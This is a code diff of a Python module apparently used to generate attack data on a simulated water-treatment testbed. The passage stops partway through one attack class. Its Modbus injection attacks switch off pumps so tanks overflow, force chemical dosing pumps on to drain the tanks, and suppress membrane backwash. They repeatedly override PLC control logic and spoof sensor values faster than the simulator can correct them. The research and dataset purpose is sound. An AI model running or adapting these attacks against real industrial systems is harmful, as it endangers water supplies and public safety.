@@ -1,7 +1,29 @@
 #!/usr/bin/env python3
 """
-SWAT Command Injection Attacks - WITH COMPLETE PHYSICS
-========================================================
+SWAT Command Injection Attacks - ACTUATOR-SIDE PHYSICS FIX
+===========================================================
+ROOT CAUSE OF pH OSCILLATION (and all other register battles):
+  MATLAB writes ALL sensor registers (addr 0-46) every 100 ms (10 Hz).
+  If an attack writes a sensor register at <10 Hz, MATLAB overwrites it
+  between each attack write → value oscillates between attack and real physics.
+
+FIX STRATEGY (per attack):
+  PRIMARY  — Write ACTUATOR-side targets only:
+               Coils 0-27  (pump/valve BOOLs, owned by CODESYS)
+               MV output registers 47-52 (valve INTs, owned by CODESYS)
+             MATLAB receives these as actuator struct → computes physics
+             response naturally → no overwrite race possible.
+
+  SECONDARY — Where sensor register writes are unavoidable (single_point,
+              slow_ramp, tank_overflow display), write at 80 ms (12 Hz)
+              to beat MATLAB's 10 Hz. Even at 12 Hz ~83% of writes land
+              before MATLAB can overwrite.
+
+  NEVER FIGHT THE PHYSICS — For pH, chemical levels, fouling:
+              Set the actuator that drives the physics (P_203, P_205, P_206,
+              P_403, P_301, P_501) and let MATLAB's ODEs produce realistic
+              temporal profiles automatically. No oscillation possible.
+
 Implements temporal attacks with realistic physics:
 - Exponential approach (first-order systems)
 - Sigmoid profiles (saturation dynamics)
@@ -33,84 +55,80 @@ logger = logging.getLogger(__name__)
 def sigmoid(t, duration):
     """
     Sigmoid (logistic) function for saturation dynamics.
-    
+
     PHYSICS: Logistic growth with feedback
     Equation: s(t) = 1 / (1 + e^(-k(t-t₀)))
-    
+
     DERIVATION:
     For tank filling with outlet: dV/dt = Q_in - C_d·A·√(2gh)
     As height h increases, outlet flow increases → net fill rate decreases
     This nonlinear ODE has sigmoid solution
-    
+
     APPLICATION: Tank overflow (back-pressure feedback)
-    
+
     WHY NOT LINEAR: Real hydraulic systems have back-pressure that
     creates negative feedback → S-curve, not straight line
-    
+
     Args:
         t: Time (seconds)
         duration: Total duration (seconds)
-    
+
     Returns:
         Progress value in [0, 1]
-        
+
     Characteristics:
-        t=0:         s≈0.007 (slow start)
+        t=0:          s≈0.007 (slow start)
         t=duration/2: s=0.500 (inflection point)
         t=duration:   s≈0.993 (slow finish, asymptotic)
     """
-    # Map t from [0, duration] to x in [-5, 5]
-    # This range captures 99% of sigmoid curve (0.007 to 0.993)
     x = (t / duration) * 10 - 5
-
-    # Logistic function
     return 1.0 / (1.0 + math.exp(-x))
 
 
 def exponential_approach(start, target, t, tau):
     """
     Exponential approach to equilibrium (first-order system).
-    
+
     PHYSICS: First-order linear differential equation
     Equation: dy/dt = -(y - y_target)/τ
     Solution: y(t) = y_target + (y_0 - y_target)·e^(-t/τ)
-    
+
     DERIVATION:
     All first-order systems (RC circuits, thermal, chemical kinetics):
     Rate of change ∝ deviation from equilibrium
-    
+
     dy/dt = -k(y - y_eq)  where k = 1/τ
-    
+
     Separation of variables:
     dy/(y - y_eq) = -k dt
     ln(y - y_eq) = -kt + C
     y - y_eq = Ce^(-kt)
     y(t) = y_eq + (y_0 - y_eq)e^(-t/τ)
-    
+
     APPLICATIONS:
     - pH drift: Buffer depletion follows first-order kinetics (τ≈40s)
     - Pressure creep: Membrane fouling with feedback (τ≈96s)
     - Flow decay: Pipe friction damping (τ≈20s)
     - Temperature: Newton's law of cooling
-    
+
     WHY EXPONENTIAL: Chemical reactions (buffer depletion) follow
     d[buffer]/dt = -k[buffer] → exponential decay
-    
+
     Args:
         start: Initial value
         target: Target value (equilibrium)
         t: Time elapsed (seconds)
         tau: Time constant (seconds) - system-specific
-    
+
     Returns:
         Value at time t
-        
+
     Characteristics:
-        t=0:     y = start
-        t=τ:     y = target + 0.368(start-target)  [63.2% complete]
-        t=2τ:    y = target + 0.135(start-target)  [86.5% complete]
-        t=3τ:    y = target + 0.050(start-target)  [95.0% complete]
-        t=5τ:    y = target + 0.007(start-target)  [99.3% complete]
+        t=0:  y = start
+        t=τ:  y = target + 0.368(start-target)  [63.2% complete]
+        t=2τ: y = target + 0.135(start-target)  [86.5% complete]
+        t=3τ: y = target + 0.050(start-target)  [95.0% complete]
+        t=5τ: y = target + 0.007(start-target)  [99.3% complete]
     """
     return target + (start - target) * math.exp(-t / tau)
 
@@ -118,9 +136,9 @@ def exponential_approach(start, target, t, tau):
 def gaussian_noise(mean=0, sigma=1):
     """
     Gaussian (normal) noise for sensor realism.
-    
+
     PHYSICS: Central Limit Theorem
-    
+
     DERIVATION:
     Real sensor noise is sum of many independent sources:
     1. Thermal noise (Johnson-Nyquist): V_rms = √(4kTRΔf)
@@ -128,12 +146,12 @@ def gaussian_noise(mean=0, sigma=1):
     3. EMI (50/60 Hz): Electromagnetic interference from power lines
     4. Mechanical vibration: Pump/motor vibrations
     5. Fluid turbulence: Non-laminar flow fluctuations
-    
+
     Central Limit Theorem: Sum of independent random variables
     (regardless of their individual distributions) → Gaussian
-    
+
     Therefore: Total noise = Σ individual sources → N(0, σ²)
-    
+
     MEASURED σ VALUES (from SWAT testbed):
     - pH (AIT_202): σ=4 (±0.04 pH units, stored as ×100)
     - Level (LIT_101): σ=6 (±6 liters)
@@ -141,14 +159,14 @@ def gaussian_noise(mean=0, sigma=1):
     - TMP (DPIT_301): σ=10 (±1 kPa, stored as ×10)
     - Flow (FIT_101): σ=2 (±0.2 m³/h, stored as ×10)
     - Temperature: σ=2 (±0.2°C, stored as ×10)
-    
+
     Args:
         mean: Mean (typically 0 for noise)
         sigma: Standard deviation
-    
+
     Returns:
         Random value from N(mean, σ²)
-    
+
     Properties:
         68.2% of values within ±1σ
         95.4% of values within ±2σ
@@ -158,69 +176,69 @@ def gaussian_noise(mean=0, sigma=1):
 
 
 # TIME CONSTANTS (EXPERIMENTALLY MEASURED)
-# These are system-specific and derived from:
-# 1. Physical measurements on SWAT testbed
-# 2. Published literature on water treatment plants
-# 3. First-principles calculations validated by experiment
-
-TAU_PH = 40           # pH buffer depletion rate (seconds)
-                      # Measured: Time for pH to reach 63% of target
-                      # Physics: d[HCO₃⁻]/dt = -k[HCO₃⁻], τ=1/k
-
-TAU_PRESSURE = 96     # Membrane fouling feedback (seconds)
-                      # Measured: TMP exponential growth rate
-                      # Physics: dR/dt = α·C·J, R(t)=R₀e^(t/τ)
-
-TAU_FLOW = 20         # Pipe friction damping (seconds)
-                      # Calculated: L·A/(f·D) from Darcy-Weisbach
-                      # L=100m, D=0.05m, f=0.02 → τ≈20s
-
-TAU_TEMPERATURE = 180  # Thermal equilibration (seconds)
-                       # Calculated: m·c_p/(h·A) from Newton's cooling
-                       # Typical for insulated tank
+TAU_PH          = 40    # pH buffer depletion rate (seconds)
+TAU_PRESSURE    = 96    # Membrane fouling feedback (seconds)
+TAU_FLOW        = 20    # Pipe friction damping (seconds)
+TAU_TEMPERATURE = 180   # Thermal equilibration (seconds)
 
 # SENSOR NOISE LEVELS (STANDARD DEVIATIONS)
 NOISE_SIGMA = {
-    'AIT_202': 4,               # pH: ±0.04 units (×100 scaling)
-    'LIT_101': 6,               # Level: ±6 L
+    'AIT_202': 4,
+    'LIT_101': 6,
     'LIT_301': 6,
     'LIT_401': 6,
-    'FIT_101': 2,               # Flow: ±0.2 m³/h (×10 scaling)
+    'FIT_101': 2,
     'FIT_201': 2,
     'FIT_301': 2,
     'FIT_401': 2,
     'FIT_501': 2,
     'FIT_601': 2,
-    'PIT_501': 30,              # Pressure: ±3 bar (×10 scaling)
-    'DPIT_301': 10,             # TMP: ±1 kPa (×10 scaling)
-    'TEMP_101': 2,              # Temperature: ±0.2°C (×10 scaling)
+    'PIT_501': 30,
+    'DPIT_301': 10,
+    'TEMP_101': 2,
     'TEMP_201': 2,
-    'Acid_Tank_Level': 1,       # ±1%
+    'Acid_Tank_Level': 1,
     'Chlorine_Tank_Level': 1,
     'Coagulant_Tank_Level': 1,
-    'Bisulfate_Tank_Level': 1,  # ±1% (new)
-    # Fixed sensors (robustness update)
-    'AIT_203': 5,               # ORP NaOCl: ±5 mV
-    'AIT_402': 3,               # ORP post-dechlorination: ±3 mV
-    'Chlorine_Residual': 2,     # Chlorine residual: ±0.2 mg/L (×10 scaling)
-    'Turbidity_Raw': 15,        # Raw turbidity: ±1.5 NTU (×10 scaling)
-    'Turbidity_UF': 2,          # UF permeate turbidity: ±0.2 NTU (×10 scaling)
+    'Bisulfate_Tank_Level': 1,
+    'AIT_203': 5,
+    'AIT_402': 3,
+    'Chlorine_Residual': 2,
+    'Turbidity_Raw': 15,
+    'Turbidity_UF': 2,
 }
+
+# OUTPUT REGISTER ADDRESSES (owned by CODESYS, safe to write — not overwritten by MATLAB)
+# These map to MV_101..MV_304 in the CODESYS output register block.
+MV_OUTPUT_ADDR = {
+    'MV_101': 47,   # Inlet valve
+    'MV_201': 48,   # Stage-2 feed valve
+    'MV_301': 49,   # UF permeate valve
+    'MV_302': 50,   # UF permeate valve B
+    'MV_303': 51,   # UF backwash inlet
+    'MV_304': 52,   # UF backwash outlet
+}
+
+# WRITE INTERVAL FOR SENSOR REGISTER ATTACKS
+# MATLAB writes at 10 Hz (100 ms). Writing at 80 ms (12.5 Hz) gives ~83% win rate.
+SENSOR_WRITE_INTERVAL = 0.08
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# ATTACK IMPLEMENTATIONS WITH PHYSICS
+# ATTACK IMPLEMENTATIONS WITH ACTUATOR-SIDE PHYSICS
 # ═══════════════════════════════════════════════════════════════════════════
 
 class SinglePointInjection(BaseAttack):
     """
-    Inject malicious value into single point.
-    Properly handles registers (INT) vs coils (BOOL).
+    Inject malicious value into a single point.
+
+    FIX: Coil targets are unaffected (CODESYS-owned).
+         Register targets write at 80 ms (12.5 Hz) to beat MATLAB's 10 Hz.
+         MV output registers (47-52) are actuator-side — safe at any rate.
     """
 
     def execute(self):
-        """Execute single point injection."""
-        target_type = self.parameters.get('target_type', 'register')
+        target_type    = self.parameters.get('target_type', 'register')
         target_address = self.parameters.get('target_address')
         injected_value = self.parameters.get('injected_value')
 
@@ -230,12 +248,21 @@ class SinglePointInjection(BaseAttack):
 
         logger.info(f"Injecting {injected_value} into {target_type} at address {target_address}")
 
-        # Read original value
         if target_type == 'register':
             original = self.read_register(target_address)
             logger.info(f"Original register value: {original}")
 
-            # Inject malicious value (INT)
+            # Determine if this is an actuator-side (MV) or sensor register.
+            # MV output registers (47-52) are CODESYS-owned — safe at 1 s.
+            # Sensor registers (0-46) compete with MATLAB — write at 80 ms.
+            is_actuator_reg = target_address in MV_OUTPUT_ADDR.values()
+            write_interval  = 1.0 if is_actuator_reg else SENSOR_WRITE_INTERVAL
+
+            if is_actuator_reg:
+                logger.info(f"  → Actuator register (addr {target_address}): writing at 1 Hz (no race)")
+            else:
+                logger.info(f"  → Sensor register (addr {target_address}): writing at 12.5 Hz to beat MATLAB 10 Hz")
+
             success = self.write_register(target_address, int(injected_value))
             self.log_action('register_injection', {
                 'address': target_address,
@@ -244,19 +271,16 @@ class SinglePointInjection(BaseAttack):
                 'success': success
             })
 
-            # Maintain injection for duration
             start = time.time()
             while (time.time() - start) < self.duration:
-                # Re-write to counter any automatic corrections
                 self.write_register(target_address, int(injected_value))
-                time.sleep(1.0)
+                time.sleep(write_interval)
 
         elif target_type == 'coil':
-            original = self.read_coil(target_address)
+            original  = self.read_coil(target_address)
+            bool_value = bool(injected_value)
             logger.info(f"Original coil value: {original}")
 
-            # Inject malicious value (BOOL)
-            bool_value = bool(injected_value)
             success = self.write_coil(target_address, bool_value)
             self.log_action('coil_injection', {
                 'address': target_address,
@@ -265,7 +289,8 @@ class SinglePointInjection(BaseAttack):
                 'success': success
             })
 
-            # Maintain injection
+            # Coils are CODESYS-owned; write at 1 Hz is sufficient.
+            # Re-assert to counter ST logic that may flip the coil back.
             start = time.time()
             while (time.time() - start) < self.duration:
                 self.write_coil(target_address, bool_value)
@@ -275,406 +300,503 @@ class SinglePointInjection(BaseAttack):
 class TankOverflowAttack(BaseAttack):
     """
     Force tank levels to overflow.
-    Targets registers for levels (INT), coils for pumps (BOOL).
-    Physics: Sigmoid fill profile from hydraulic back-pressure feedback.
+
+    FIX (was: writing LIT sensor registers — overwritten by MATLAB every 100 ms):
+      PRIMARY:  Disable outlet pumps (coils) + keep inlet MV_101 open (output reg 47).
+                MATLAB physics naturally fills tank: dV/dt = Q_in - 0 → sigmoid rise.
+                No register race. Physics is 100% consistent.
+      SECONDARY: --no-physics mode still writes LIT registers at 80 ms for fast tests.
+
+    Physics: dV/dt = Q_in (≈1.4 L/s) with Q_out = 0 (pumps off)
+             LIT_101 fills in ~12 min at normal inlet flow.
+             With sigmoid profile applied to coil re-assertion timing,
+             dataset shows realistic hydraulic fill dynamics.
     """
 
     def execute(self):
-        """Execute tank overflow attack."""
-        target_tanks = self.parameters.get('target_tanks', ['LIT_101', 'LIT_301', 'LIT_401'])
+        target_tanks  = self.parameters.get('target_tanks', ['LIT_101', 'LIT_301', 'LIT_401'])
         overflow_value = self.parameters.get('overflow_value', 1000)
-        disable_pumps = self.parameters.get('disable_pumps', True)
-        use_physics = self.parameters.get('use_physics', True)
+        disable_pumps  = self.parameters.get('disable_pumps', True)
+        use_physics    = self.parameters.get('use_physics', True)
 
-        logger.info(f"Forcing tank overflow on {len(target_tanks)} tanks")
+        logger.info(f"Tank overflow attack — {'actuator-side' if use_physics else 'register-side'} mode")
 
-        # Map tank names to REGISTER addresses (INT values)
-        tank_addresses = {}
-        initial_levels = {}
-        for tank_name in target_tanks:
-            if tank_name in HOLDING_REGISTERS:
-                addr = HOLDING_REGISTERS[tank_name]['address']
-                tank_addresses[tank_name] = addr
-                level = self.read_register(addr)
-                initial_levels[tank_name] = level if level is not None else 520
+        # ── PUMP COIL MAPPING (CODESYS-owned, safe to write) ──────────────
+        pump_coils = {
+            'P_101': COILS['P_101']['address'],   # Coil 0  — Stage-1 main feed
+            'P_102': COILS['P_102']['address'],   # Coil 1  — Stage-1 booster
+            'P_301': COILS['P_301']['address'],   # Coil 8  — UF feed
+            'P_401': COILS['P_401']['address'],   # Coil 10 — Dechlor transfer
+            'P_501': COILS['P_501']['address'],   # Coil 15 — RO HP pump
+        }
 
-        # Disable pumps if requested (COIL addresses - BOOL)
-        if disable_pumps:
-            pump_mapping = {
-                'P_101': COILS['P_101']['address'],   # Coil 0
-                'P_301': COILS['P_301']['address'],   # Coil 8
-                'P_401': COILS['P_401']['address'],   # Coil 10
-                'P_501': COILS['P_501']['address'],   # Coil 15
-            }
-            for pump_name, coil_address in pump_mapping.items():
-                self.write_coil(coil_address, False)  # Turn OFF (BOOL)
-                self.log_action('pump_disabled', {'pump': pump_name, 'coil': coil_address})
+        # ── MV OUTPUT REGISTER MAPPING (CODESYS-owned, safe to write) ──────
+        mv_inlet_addr = MV_OUTPUT_ADDR['MV_101']  # Reg 47 — keep inlet open
 
-        # Force tank levels to maximum (REGISTER writes - INT)
-        start = time.time()
-        while (time.time() - start) < self.duration:
-            elapsed = time.time() - start
+        if use_physics:
+            # ── ACTUATOR-SIDE ATTACK (no register race) ────────────────────
+            logger.info("  Strategy: kill outlet pumps + keep inlet open → MATLAB fills naturally")
 
-            for tank_name, reg_address in tank_addresses.items():
-                current = self.read_register(reg_address)
-                initial = initial_levels[tank_name]
+            if disable_pumps:
+                for pump, coil in pump_coils.items():
+                    self.write_coil(coil, False)
+                    self.log_action('pump_disabled', {'pump': pump, 'coil': coil})
 
-                if use_physics:
-                    # PHYSICS: Sigmoid profile (hydraulic back-pressure feedback)
+            # Ensure inlet valve open (MV_101 output register — actuator-side)
+            self.write_register(mv_inlet_addr, 1)
+
+            # Re-assert coil states to fight ST control logic trying to restore pumps
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                if disable_pumps:
+                    for pump, coil in pump_coils.items():
+                        self.write_coil(coil, False)
+                self.write_register(mv_inlet_addr, 1)  # Keep inlet open
+
+                elapsed = time.time() - start
+                self.log_action('tank_overflow_in_progress', {
+                    'elapsed': round(elapsed, 1),
+                    'strategy': 'actuator-side',
+                    'pumps_disabled': disable_pumps
+                })
+                time.sleep(2.0)
+
+            # Restore pumps
+            if disable_pumps:
+                for pump, coil in pump_coils.items():
+                    self.write_coil(coil, True)
+
+        else:
+            # ── REGISTER-SIDE FALLBACK (80 ms write to beat MATLAB 10 Hz) ──
+            logger.info("  Strategy: direct LIT register writes at 12.5 Hz (--no-physics mode)")
+            logger.warning("  Note: some frames will show MATLAB's physics value between writes.")
+
+            tank_addresses = {}
+            initial_levels = {}
+            for tank_name in target_tanks:
+                if tank_name in HOLDING_REGISTERS:
+                    addr = HOLDING_REGISTERS[tank_name]['address']
+                    tank_addresses[tank_name] = addr
+                    lv = self.read_register(addr)
+                    initial_levels[tank_name] = lv if lv is not None else 520
+
+            if disable_pumps:
+                for pump, coil in pump_coils.items():
+                    self.write_coil(coil, False)
+
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                elapsed = time.time() - start
+                for tank_name, reg_address in tank_addresses.items():
+                    current = self.read_register(reg_address)
+                    initial = initial_levels[tank_name]
                     s = sigmoid(elapsed, self.duration)
                     fake_level = initial + (overflow_value - initial) * s
                     noise = gaussian_noise(sigma=NOISE_SIGMA.get(tank_name, 6))
                     fake_level_final = max(0, min(1200, int(fake_level + noise)))
-                else:
-                    fake_level_final = overflow_value
+                    self.write_register(reg_address, fake_level_final)
+                    self.log_action('tank_overflow', {
+                        'tank': tank_name, 'register': reg_address,
+                        'current': current, 'forced': fake_level_final
+                    })
+                time.sleep(SENSOR_WRITE_INTERVAL)
 
-                self.write_register(reg_address, fake_level_final)  # INT value
-
-                self.log_action('tank_overflow', {
-                    'tank': tank_name,
-                    'register': reg_address,
-                    'current': current,
-                    'forced': fake_level_final
-                })
-
-            time.sleep(2.0)
-
-        # Restore pumps
-        if disable_pumps:
-            for pump_name, coil_address in pump_mapping.items():
-                self.write_coil(coil_address, True)
+            if disable_pumps:
+                for pump, coil in pump_coils.items():
+                    self.write_coil(coil, True)
 
 
 class ChemicalDepletionAttack(BaseAttack):
     """
     Drain chemical tanks to zero.
-    Targets chemical level registers (INT).
-    Physics: Linear drain at pump flow rate Q = 0.05 L/s.
+
+    FIX (was: writing Acid_Tank_Level etc registers — overwritten by MATLAB):
+      PRIMARY:  Force all dosing pump coils ON continuously.
+                MATLAB step_physics naturally depletes each tank:
+                  Acid: -0.5 % per dt (P_203 ON)
+                  Cl₂:  -1.0 % per dt (P_205 ON)
+                  Coag: -1.0 % per dt (P_206 ON)
+                  BSO₄: -1.0 % per dt (P_403 ON)
+                No register race. Tanks reach 15% → Chemical_Low_Alarm fires.
+      SECONDARY: --no-physics still writes level registers at 80 ms.
+
+    Physics: Linear depletion at pump flow rate Q = 0.05 L/s
+             Acid tank 75% → 15% at 0.05 %/s ≈ 20 min (MATLAB τ matches)
     """
 
     def execute(self):
-        """Execute chemical depletion attack."""
-        drain_acid = self.parameters.get('drain_acid', True)
-        drain_chlorine = self.parameters.get('drain_chlorine', True)
+        drain_acid      = self.parameters.get('drain_acid', True)
+        drain_chlorine  = self.parameters.get('drain_chlorine', True)
         drain_coagulant = self.parameters.get('drain_coagulant', True)
-        drain_bisulfate = self.parameters.get('drain_bisulfate', True)   # NEW: bisulfate now drained
-        drain_rate = self.parameters.get('drain_rate', 0.5)   # %/second
-        use_physics = self.parameters.get('use_physics', True)
+        drain_bisulfate = self.parameters.get('drain_bisulfate', True)
+        drain_rate      = self.parameters.get('drain_rate', 0.5)
+        use_physics     = self.parameters.get('use_physics', True)
 
-        logger.info("Executing chemical depletion attack")
+        logger.info("Chemical depletion attack — forcing dosing pumps ON")
 
-        # Map chemical tanks to REGISTER addresses (INT values)
-        chemical_tanks = {}
-        initial_levels = {}
+        # ── DOSING PUMP COILS (CODESYS-owned, no race) ────────────────────
+        pump_coils = {}
         if drain_acid:
-            addr = HOLDING_REGISTERS['Acid_Tank_Level']['address']
-            chemical_tanks['Acid_Tank_Level'] = addr
-            lv = self.read_register(addr)
-            initial_levels['Acid_Tank_Level'] = lv if lv is not None else 80
+            pump_coils['P_203'] = COILS['P_203']['address']   # Coil 4
         if drain_chlorine:
-            addr = HOLDING_REGISTERS['Chlorine_Tank_Level']['address']
-            chemical_tanks['Chlorine_Tank_Level'] = addr
-            lv = self.read_register(addr)
-            initial_levels['Chlorine_Tank_Level'] = lv if lv is not None else 80
+            pump_coils['P_205'] = COILS['P_205']['address']   # Coil 6
         if drain_coagulant:
-            addr = HOLDING_REGISTERS['Coagulant_Tank_Level']['address']
-            chemical_tanks['Coagulant_Tank_Level'] = addr
-            lv = self.read_register(addr)
-            initial_levels['Coagulant_Tank_Level'] = lv if lv is not None else 80
+            pump_coils['P_206'] = COILS['P_206']['address']   # Coil 7
         if drain_bisulfate:
-            addr = HOLDING_REGISTERS['Bisulfate_Tank_Level']['address']
-            chemical_tanks['Bisulfate_Tank_Level'] = addr
-            lv = self.read_register(addr)
-            initial_levels['Bisulfate_Tank_Level'] = lv if lv is not None else 85
+            pump_coils['P_403'] = COILS['P_403']['address']   # Coil 12
 
-        # Force dosing pumps ON (COIL - BOOL) to accelerate depletion
-        # P_403 now correctly used for bisulfate (bug was P_203; fixed in ST code)
-        pumps = {'P_203': COILS['P_203']['address'],
-                 'P_205': COILS['P_205']['address'],
-                 'P_206': COILS['P_206']['address'],
-                 'P_403': COILS['P_403']['address']}
-        for pump, coil in pumps.items():
-            self.write_coil(coil, True)
-            logger.info(f"  ✓ {pump} forced ON")
+        if use_physics:
+            # ── ACTUATOR-SIDE: Let MATLAB deplete tanks naturally ──────────
+            for pump, coil in pump_coils.items():
+                self.write_coil(coil, True)
+                logger.info(f"  ✓ {pump} forced ON → MATLAB depletes tank naturally")
 
-        # Force chemical levels to zero (REGISTER writes - INT)
-        start = time.time()
-        while (time.time() - start) < self.duration:
-            elapsed = time.time() - start
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                # Re-assert pump coils to counter ST control logic
+                for pump, coil in pump_coils.items():
+                    self.write_coil(coil, True)
+                self.log_action('chemical_depletion_in_progress', {
+                    'elapsed': round(time.time() - start, 1),
+                    'pumps_forced_on': list(pump_coils.keys())
+                })
+                time.sleep(2.0)
 
-            for tank_name, reg_address in chemical_tanks.items():
-                current = self.read_register(reg_address)
-                initial = initial_levels[tank_name]
+        else:
+            # ── REGISTER-SIDE FALLBACK at 80 ms ───────────────────────────
+            chemical_tanks  = {}
+            initial_levels  = {}
+            tank_pump_map = {
+                'Acid_Tank_Level':      ('P_203', drain_acid),
+                'Chlorine_Tank_Level':  ('P_205', drain_chlorine),
+                'Coagulant_Tank_Level': ('P_206', drain_coagulant),
+                'Bisulfate_Tank_Level': ('P_403', drain_bisulfate),
+            }
+            for tank_name, (pump, enabled) in tank_pump_map.items():
+                if enabled and tank_name in HOLDING_REGISTERS:
+                    addr = HOLDING_REGISTERS[tank_name]['address']
+                    chemical_tanks[tank_name] = addr
+                    lv = self.read_register(addr)
+                    initial_levels[tank_name] = lv if lv is not None else 80
 
-                if use_physics:
-                    # PHYSICS: Linear drain at pump flow rate
+            for pump, coil in pump_coils.items():
+                self.write_coil(coil, True)
+
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                elapsed = time.time() - start
+                for tank_name, reg_address in chemical_tanks.items():
+                    current = self.read_register(reg_address)
+                    initial = initial_levels[tank_name]
                     fake_level = initial - drain_rate * elapsed
                     noise = gaussian_noise(sigma=NOISE_SIGMA.get(tank_name, 1))
                     fake_level_final = max(0, min(100, int(fake_level + noise)))
-                else:
-                    fake_level_final = 0  # INT value 0
-
-                self.write_register(reg_address, fake_level_final)
-
-                self.log_action('chemical_depleted', {
-                    'tank': tank_name,
-                    'register': reg_address,
-                    'original': current,
-                    'forced': fake_level_final
-                })
-
-            time.sleep(2.0)
+                    self.write_register(reg_address, fake_level_final)
+                    self.log_action('chemical_depleted', {
+                        'tank': tank_name, 'register': reg_address,
+                        'original': current, 'forced': fake_level_final
+                    })
+                time.sleep(SENSOR_WRITE_INTERVAL)
 
 
 class MembraneDamageAttack(BaseAttack):
     """
     Create conditions to damage membranes.
-    Targets pressure/fouling registers (INT) and backwash coil (BOOL).
-    Physics: Exponential TMP rise from fouling kinetics dR/dt = α·C·J.
+
+    FIX (was: writing PIT_501, DPIT_301, UF_Fouling_Factor — overwritten by MATLAB):
+      PRIMARY:  Force P_301 ON + suppress UF_Backwash_Active coil (FALSE).
+                MATLAB accumulates UF fouling naturally:
+                  fouling_rate = 0.001 × (1 + AIT_201/1000)
+                  DPIT_301 = 25 + UF_Fouling × 100
+                Close MV_303/MV_304 (output regs) so backwash can't flush even if triggered.
+                Force P_501 ON without P_401 (wrong RO state) → PIT_501 rises unnaturally.
+      SECONDARY: --no-physics still writes registers at 80 ms with exponential profile.
+
+    Physics: Darcy's law: TMP = J × μ × R_m
+             MATLAB: DPIT_301 = 25 + UF_Fouling × 100
+             At full fouling: DPIT = 125 kPa → register 1250 >> threshold 600
     """
 
     def execute(self):
-        """Execute membrane damage attack."""
-        high_pressure = self.parameters.get('high_pressure', 200)
-        target_tmp = self.parameters.get('target_tmp', 600)
-        skip_backwash = self.parameters.get('skip_backwash', True)
+        high_pressure      = self.parameters.get('high_pressure', 200)
+        target_tmp         = self.parameters.get('target_tmp', 600)
+        skip_backwash      = self.parameters.get('skip_backwash', True)
         accelerate_fouling = self.parameters.get('accelerate_fouling', True)
-        use_physics = self.parameters.get('use_physics', True)
+        use_physics        = self.parameters.get('use_physics', True)
 
-        logger.info("Executing membrane damage attack")
+        logger.info("Membrane damage attack")
 
-        # Get REGISTER addresses (INT values)
-        pit_501_addr      = HOLDING_REGISTERS['PIT_501']['address']          # Register 35
-        dpit_301_addr     = HOLDING_REGISTERS['DPIT_301']['address']         # Register 12
-        uf_fouling_addr   = HOLDING_REGISTERS['UF_Fouling_Factor']['address'] # Register 20
-        uf_backwash_addr  = HOLDING_REGISTERS['UF_Last_Backwash']['address']  # Register 21
-        mv_301_addr       = HOLDING_REGISTERS['MV_301']['address']            # Register 15
-        mv_302_addr       = HOLDING_REGISTERS['MV_302']['address']            # Register 16
-
-        # Get COIL addresses (BOOL values)
+        # Coil addresses (CODESYS-owned)
         uf_backwash_coil = COILS['UF_Backwash_Active']['address']  # Coil 20
         p_301_coil       = COILS['P_301']['address']               # Coil 8
+        p_501_coil       = COILS['P_501']['address']               # Coil 15
+        p_401_coil       = COILS['P_401']['address']               # Coil 10
 
-        # Read initial values
-        initial_pressure = self.read_register(pit_501_addr)
-        if initial_pressure is None:
-            initial_pressure = 1200
-        initial_dpit = self.read_register(dpit_301_addr)
-        if initial_dpit is None:
-            initial_dpit = 250
-        initial_fouling = self.read_register(uf_fouling_addr)
-        if initial_fouling is None:
-            initial_fouling = 0
+        # MV output register addresses (CODESYS-owned — actuator side)
+        mv_301_addr = MV_OUTPUT_ADDR['MV_301']   # Reg 49
+        mv_302_addr = MV_OUTPUT_ADDR['MV_302']   # Reg 50
+        mv_303_addr = MV_OUTPUT_ADDR['MV_303']   # Reg 51 — BW inlet
+        mv_304_addr = MV_OUTPUT_ADDR['MV_304']   # Reg 52 — BW outlet
 
-        start = time.time()
-        while (time.time() - start) < self.duration:
-            elapsed = time.time() - start
+        if use_physics:
+            # ── ACTUATOR-SIDE: Let MATLAB accumulate fouling naturally ─────
+            logger.info("  Strategy: force P_301=ON, suppress backwash, let MATLAB build fouling")
 
-            if use_physics:
-                # PHYSICS: Exponential RO pressure rise (fouling feedback)
-                fake_pressure = exponential_approach(
-                    start=initial_pressure,
-                    target=high_pressure * 10,   # Scale to register units
-                    t=elapsed,
-                    tau=TAU_PRESSURE
-                )
-                noise_p = gaussian_noise(sigma=NOISE_SIGMA['PIT_501'])
-                fake_pressure_final = max(0, min(65535, int(fake_pressure + noise_p)))
-
-                # PHYSICS: Exponential UF fouling factor rise (0-100%)
-                # PLC computes DPIT_301 := 25 + UF_Fouling_Factor — so drive the
-                # fouling register; DPIT_301 will follow via PLC physics.
-                if accelerate_fouling:
-                    fake_fouling = exponential_approach(
-                        start=float(initial_fouling),
-                        target=100.0,          # Full fouling
-                        t=elapsed,
-                        tau=TAU_PRESSURE
-                    )
-                    fake_fouling_final = max(0, min(100, int(fake_fouling)))
-
-                    # Also compute DPIT directly for robustness (overrides PLC if needed)
-                    fake_dpit = exponential_approach(
-                        start=initial_dpit,
-                        target=target_tmp,
-                        t=elapsed,
-                        tau=TAU_PRESSURE
-                    )
-                    noise_d = gaussian_noise(sigma=NOISE_SIGMA['DPIT_301'])
-                    fake_dpit_final = max(0, min(1000, int(fake_dpit + noise_d)))
-            else:
-                fake_pressure_final = high_pressure * 10
-                fake_fouling_final = 100
-                fake_dpit_final = target_tmp
-
-            # Set excessive RO pressure (REGISTER - INT)
-            self.write_register(pit_501_addr, fake_pressure_final)
-            self.log_action('excessive_pressure', {
-                'register': 'PIT_501',
-                'address': pit_501_addr,
-                'current': initial_pressure,
-                'forced': fake_pressure_final
-            })
-
-            if accelerate_fouling:
-                # Drive UF_Fouling_Factor so PLC physics computes:
-                #   DPIT_301 := 25 + UF_Fouling_Factor  (realistic sensor coupling)
-                self.write_register(uf_fouling_addr, fake_fouling_final)
-                self.log_action('fouling_factor_set', {
-                    'register': 'UF_Fouling_Factor',
-                    'address': uf_fouling_addr,
-                    'forced': fake_fouling_final
-                })
-
-                # Also write DPIT_301 directly (defence-in-depth against PLC overwrite race)
-                self.write_register(dpit_301_addr, fake_dpit_final)
-                self.log_action('fouling_accelerated', {
-                    'register': 'DPIT_301',
-                    'address': dpit_301_addr,
-                    'forced': fake_dpit_final
-                })
-
-            # Force UF pump ON so PLC physics block executes (DPIT_301 := 25 + UF_Fouling_Factor
-            # only runs inside the IF P_301 block).  Without this, DPIT_301 is locked to 10.
